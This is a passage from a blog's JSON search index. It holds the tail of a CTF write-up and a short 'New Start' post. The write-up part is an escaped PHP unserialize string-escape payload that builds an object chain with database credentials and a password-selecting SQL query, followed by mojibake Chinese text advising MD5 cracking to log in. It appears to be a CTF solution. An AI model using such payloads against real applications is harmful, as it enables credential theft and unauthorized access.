1age&#x3D;&amp;nickname&#x3D;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:2:&#123;s:3:&quot;age&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:6:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:7:&quot;noob123&quot;;s:6:&quot;dbpass&quot;;s:7:&quot;noob123&quot;;s:8:&quot;database&quot;;s:7:&quot;noob123&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username&#x3D;?&quot;;&#125;&#125;&#125; md5è§£å¯†ç™»å½•å³å¯ å‚è€ƒé“¾æ¥: http://p3rh4ps.top/index.php/2020/02/21/820-2-21-i%e6%98%a5%e7%a7%8b%e5%85%ac%e7%9b%8a%e8%b5%9b%e5%87%ba%e9%a2%98%e7%ac%94%e8%ae%b0/?tdsourcetag=s_pctim_aiomsg","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"New Start","slug":"start","date":"2020-02-20T11:17:40.000Z","updated":"2020-02-20T11:59:16.262Z","comments":true,"path":"2020/02/20/start/","link":"","permalink":"https://glotozz.github.io/2020/02/20/start/","excerpt":"","text":"ã€‚å³æ˜¯ç»ˆç‚¹ä¹Ÿæ˜¯èµ·ç‚¹","categories":[],"tags":[]}]}